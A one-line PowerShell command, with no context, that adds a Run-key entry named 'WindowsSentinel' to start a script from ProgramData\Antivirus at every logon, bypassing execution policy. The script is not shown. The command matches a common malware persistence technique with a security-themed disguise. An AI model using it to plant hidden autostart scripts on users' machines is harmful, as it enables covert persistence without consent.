Set-ItemProperty `
  -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "WindowsSentinel" `
  -Value "powershell.exe -ExecutionPolicy Bypass -File `"$env:ProgramData\Antivirus\agent.ps1`""
